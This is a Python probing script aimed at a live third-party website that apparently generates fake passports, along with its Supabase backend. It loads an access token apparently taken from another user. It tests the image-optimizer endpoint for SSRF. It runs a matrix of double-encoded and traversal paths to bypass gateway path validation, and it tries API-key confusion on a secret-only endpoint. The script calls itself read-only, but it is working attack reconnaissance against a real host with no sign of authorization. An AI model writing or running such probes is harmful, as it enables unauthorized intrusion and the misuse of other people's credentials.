#!/usr/bin/env python3
"""Probe set 10: worker/rembg status, image-optimizer URL handling,
Supabase custom-domain gateway path-validation bypass matrix (read-only)."""
import ssl, json, time, random, string, http.cookiejar, urllib.request, urllib.error

CTX = ssl.create_default_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
BASE = "https://onlyfakeai.ru"
CDN = "https://cdn.onlyfakeai.ru"
KEY = "<publishable-key>"
cj = http.cookiejar.CookieJar()
OPENER = urllib.request.build_opener(urllib.request.HTTPSHandler(context=CTX),
                                     urllib.request.HTTPCookieProcessor(cj))
TOK = json.load(open("their_token.txt"))["access_token"]


def req(method, url, headers=None, body=None, timeout=25):
    h = {"User-Agent": UA, "Accept": "*/*"}
    if headers:
        h.update(headers)
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with OPENER.open(r, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return 0, {}, str(e).encode()


def show(tag, st, hd, b, n=220):
    print(f"[{tag}] HTTP {st} ct={hd.get('content-type','')[:35]} len={len(b)}: "
          f"{b.decode('utf-8','ignore')[:n].replace(chr(10),' ')}")
    time.sleep(1)


req("GET", BASE + "/")

# 1) background removal service status with a real tiny PNG
png = bytes.fromhex(
    "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489"
    "0000000d49444154789c626001000000ffff03000006000557bfabd40000000049454e44ae426082")
bnd = "----B" + "".join(random.choices(string.ascii_letters + string.digits, k=24))
mp = (f"--{bnd}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"a.png\"\r\n"
      f"Content-Type: image/png\r\n\r\n").encode() + png + f"\r\n--{bnd}--\r\n".encode()
show("remove-background png", *req("POST", BASE + "/api/remove-background",
                                   {"Content-Type": f"multipart/form-data; boundary={bnd}"}, mp))

# 2) worker endpoints status (read-only)
show("status/1", *req("GET", BASE + "/api/status/1"))
show("no-watermark/1", *req("GET", BASE + "/api/no-watermark/1",
                            {"Authorization": "Bearer " + TOK}))
show("submit-photoshop-job (credit gate)", *req(
    "POST", BASE + "/api/submit-photoshop-job",
    {"Authorization": "Bearer " + TOK, "Content-Type": "application/json"},
    json.dumps({"documentType": "passport", "country": "USA"}).encode()))

# 3) image optimizer: local-path SSRF / protocol-relative / allowlisted remote
for u in ["/api/supabase/health", "//cdn.onlyfakeai.ru/health",
          "https://cdn.onlyfakeai.ru/storage/v1/object/public/product/passport/USA_Passport_2024-EXAMPLE.jpg"]:
    url = BASE + "/_next/image?url=" + urllib.parse.quote(u, safe="") + "&w=64&q=75"
    show("imgopt " + u[:60], *req("GET", url))

# 4) gateway path-validation matrix (double-encoding / traversal / backslash)
paths = [
    "/api/supabase/rest/v1/%2e%2e/%2e%2e/auth/v1/health",
    "/api/supabase/rest/v1/%252e%252e%252f%252e%252e%252fauth%252fv1%252fhealth",
    "/api/supabase/rest/v1/..%2fauth%2fv1%2fhealth",
    "/api/supabase/rest/v1/%2e%2e%5cauth%5cv1%5chealth",
    "/api/supabase/storage/v1/%2e%2e/rest/v1/",
    "/api/supabase/REST/v1/",
    "/api/supabase/rest/v1//",
    "/api/supabase/rest/v1",
]
for p in paths:
    show("gw " + p[:72], *req("GET", BASE + p, {"apikey": KEY}))

# 5) API-key type confusion attempts on the secret-only endpoint
for tag, hdr in [
    ("no-apikey", {}),
    ("bearer-publishable", {"Authorization": "Bearer " + KEY}),
    ("apikey-in-query", {}),
]:
    url = CDN + "/rest/v1/" + ("?apikey=" + KEY if tag == "apikey-in-query" else "")
    show("secret-ep " + tag, *req("GET", url, hdr))
